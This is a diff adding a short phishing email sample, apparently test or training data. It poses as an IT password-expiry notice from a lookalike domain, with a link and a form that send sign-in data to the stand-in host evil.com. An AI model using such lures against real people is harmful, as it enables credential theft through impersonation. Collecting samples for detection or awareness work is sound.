@@ -1,0 +1,6 @@
+Subject: Password Expiry Notice
+From: it-admin@company-portal-update.com
+To: victim@company.com
+
+Your password expires in 24 hours. Click <a href='http://evil.com/login'>here</a> to update your billing. Sign in to prevent lockout.
+<form action='http://evil.com/submit' type='password'></form>
